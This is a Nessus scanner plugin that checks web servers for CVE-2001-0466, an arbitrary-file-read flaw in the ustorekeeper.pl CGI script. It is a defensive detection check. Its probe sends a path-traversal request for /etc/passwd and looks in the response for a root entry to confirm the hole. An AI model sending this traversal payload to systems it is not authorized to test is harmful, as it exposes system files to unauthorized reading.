#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10645);
 script_bugtraq_id(2536);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2001-0466");

 name["english"] = "ustorekeeper file reading";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that allows reading
arbitrary files.

Description :

The 'ustorekeeper.pl' CGI script installed on the remote host allows
an attacker to read arbitrary files subject to the privileges of the
http daemon (usually root or nobody). 

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=98633176230748&w=2

Solution : 

Remove the CGI script.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of ustorekeeper.pl";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))security_warning(port);
}
